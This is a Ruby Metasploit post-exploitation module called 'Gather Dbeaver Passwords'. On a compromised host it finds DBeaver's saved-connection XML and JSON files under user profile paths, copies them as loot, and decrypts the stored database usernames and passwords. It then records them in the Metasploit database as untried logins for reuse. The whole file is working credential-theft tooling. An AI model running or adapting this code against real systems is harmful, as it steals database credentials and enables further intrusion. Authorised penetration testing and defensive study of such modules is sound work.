##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Rex::Parser::Dbeaver

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gather Dbeaver Passwords',
        'Description' => %q{
          This module will determine if Dbeaver is installed on the target system and, if it is, it will try to
          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
          where possible.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://blog.kali-team.cn/Metasploit-dbeaver-9f42e26241c94ba785dce5f1e69697aa' ]
        ],
        'Author' => ['Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'linux', 'win', 'osx', 'unix'],
        'SessionTypes' => [ 'meterpreter', 'shell', 'powershell' ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        OptString.new('XML_FILE_PATH', [ false, 'Specifies the .dbeaver-data-sources.xml file path for Dbeaver']),
        OptString.new('JSON_DIR_PATH', [ false, 'Specifies the json directory path for Dbeaver']),
      ]
    )
  end

  def print_and_save(all_result)
    pw_tbl = Rex::Text::Table.new(
      'Header' => 'Dbeaver Password',
      'Columns' => [
        'Name',
        'Protocol',
        'Hostname',
        'Port',
        'Username',
        'Password',
        'DB',
        'URI',
        'Type',
      ]
    )
    all_result.each do |item|
      item.each do |_key, value|
        pw_tbl << value.values
        next if value['user'].empty? && value['password'].empty?

        config = {
          type: value['provider'],
          host: value['host'],
          port: value['port'],
          username: value['user'],
          password: value['password']
        }
        dbeaver_store_config(config)
      end
    end
    if pw_tbl.rows.count > 0
      path = store_loot('host.dbeaver', 'text/plain', session, pw_tbl, 'dbeaver.txt', 'Dbeaver Password')
      print_good("Passwords stored in: #{path}")
      print_good(pw_tbl.to_s)
    end
  end

  def dbeaver_store_config(config)
    service_data = {
      address: config[:host],
      port: config[:port],
      service_name: config[:type],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username]
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def parse_json_dir(json_dir)
    some_result = []
    credentials_config = File.join(json_dir, 'credentials-config.json')
    data_sources = File.join(json_dir, 'data-sources.json')
    if session.platform == 'windows'
      credentials_config.gsub!('/') { '\\' }
      data_sources.gsub!('/') { '\\' }
    end
    begin
      if file_exist?(credentials_config) && file_exist?(data_sources)
        credentials_config_data = read_file(credentials_config) || ''
        data_sources_data = read_file(data_sources) || ''
        print_error('The file could not be read') if data_sources_data.empty? || credentials_config_data.empty?
        credentials_config_loot_path = store_loot('dbeaver.creds', 'text/json', session, credentials_config_data, credentials_config)
        data_sources_loot_path = store_loot('dbeaver.creds', 'text/json', session, data_sources_data, data_sources)
        print_good("dbeaver credentials-config.json saved to #{credentials_config_loot_path}")
        print_good("dbeaver data-sources.json saved to #{data_sources_loot_path}")
        some_result << parse_data_sources(data_sources_data, credentials_config_data)
        print_status("Finished processing #{json_dir}")
      end
    rescue Rex::Parser::Dbeaver::Error::DbeaverError => e
      print_error("Error when parsing #{data_sources} and #{credentials_config}: #{e}")
    end
    return some_result
  end

  def parse_xml_file(fullpath)
    some_result = []
    begin
      if file_exist?(fullpath)
        file_data = read_file(fullpath) || ''
        print_error("The file #{fullpath} could not be read") if file_data.empty?
        loot_path = store_loot('dbeaver.creds', 'text/xml', session, file_data, fullpath)
        print_good("dbeaver .dbeaver-data-sources.xml saved to #{loot_path}")
        result = parse_data_sources_xml(file_data)
        if !result.empty?
          some_result << result
        end
        print_status("Finished processing #{fullpath}")
      end
    rescue Rex::Parser::Dbeaver::Error::DbeaverError => e
      print_error("Error when parsing #{fullpath}: #{e}")
    end
    return some_result
  end

  def get_path
    path_hash = Hash.new
    xml_paths = []
    case session.platform
    when 'windows'
      app_data = get_env('AppData')
      if app_data.present?
        xml_paths.push(app_data + '\DBeaverData\workspace6\General\.dbeaver-data-sources.xml')
        path_hash['json'] = app_data + '\DBeaverData\workspace6\General\.dbeaver'
      end
      home = get_env('USERPROFILE')
      if home.present?
        xml_paths.push(home + '\.dbeaver4\General\.dbeaver-data-sources.xml')
      end
    when 'linux', 'osx', 'unix'
      home = get_env('HOME')
      if home.present?
        xml_paths.push(home + '/.dbeaver4/General/.dbeaver-data-sources.xml')
        xml_paths.push(home + '/.local/share/DBeaverData/workspace6/General/.dbeaver-data-sources.xml')
        path_hash['json'] = home + '/.local/share/DBeaverData/workspace6/General/.dbeaver'
      end
    end
    path_hash['xml'] = xml_paths
    return path_hash
  end

  def run
    print_status('Gather Dbeaver Passwords')
    all_result = []
    xml_path = ''
    json_path = ''
    if datastore['XML_FILE_PATH'].present?
      xml_path = datastore['XML_FILE_PATH']
      print_status("Looking for #{xml_path}")
      all_result += parse_xml_file(xml_path)
    end
    if datastore['JSON_DIR_PATH'].present?
      json_path = datastore['JSON_DIR_PATH']
      print_status("Looking for JSON files in #{json_path}")
      all_result += parse_json_dir(json_path)
    end
    if xml_path.empty? && json_path.empty?
      path_hash = get_path
      xml_paths = path_hash['xml'] || []
      xml_paths.each do |path|
        result = parse_xml_file(path)
        if !result.empty?
          all_result += result
        end
      end
      if !path_hash['json'].blank?
        result = parse_json_dir(path_hash['json'])
        if !result.empty?
          all_result += result
        end
      end
    end
    print_and_save(all_result)
  end
end
